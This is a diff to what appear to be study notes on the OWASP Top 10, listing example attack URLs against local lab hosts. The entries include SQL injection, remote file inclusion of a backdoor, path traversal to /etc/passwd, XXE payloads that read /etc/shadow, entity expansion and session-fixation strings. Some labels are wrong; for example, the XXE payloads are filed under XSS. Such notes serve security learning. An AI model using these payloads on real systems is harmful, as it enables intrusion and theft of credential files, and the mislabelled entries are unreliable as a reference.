@@ -70,15 +70,17 @@ cat  /var/log/nginx/access.log
 * A10:2021-Server-Side Request Forgery SSRF
 
 ## Attacs
+* Broken Authentication http://192.168.1.11/authentication.php?JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1
+* Cryptographic Failures 
+* SQLI https://192.168.1.44/?id=3 or 'a'='a'
 * RFI http://192.168.1.44/vuln_page.php?file=http://192.168.1.44/backdoor_
     * http://192.168.1.44/some-page?page=http://192.168.1.44/other-page.htm/malicius-code.php
 * LFI http://192.168.1.44/vuln.php?data=O:8:%22Example1%22:1:{s:10:%22cache_file%22;s:15:%22../../index.php%22;}
     * http://192.168.1.44/script.php?page=../../../../../../../../etc/passwd
     * http://192.168.1.44/get-files?file=../../../../some dir/some file
-* SQLI https://192.168.1.44/?id=3 or 'a'='a'
 * Monitoring http://192.168.1.44/var/log/nginx/monitoring.log
+* Identification and Authentication Failures was previously Broken Authentication http://192.168.1.44/ftp/coupons_2013.md.bak%2500.md
 * Component http://192.168.1.44/rabia.php?xml=%3C!ENTITY%20ac%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php%22%3E]%3E
-* Broken Authentication http://192.168.1.11/authentication.php?JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1
 * Session Fixation http://192.168.1.44/rabia.php?PHPSESSID=qwrtop95340hhty49gjbc84
 * XSS http://192.168.1.44/login.php?xml=%3C!DOCTYPE%20replace%20[%3C!ENTITY%20ent%20SYSTEM%20%22file:///etc/shadow%22%3E%20]%3E
     *  http://192.168.1.44/login.php?xml=%3C!ENTITY%20lol2%20%22&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;%22%3E
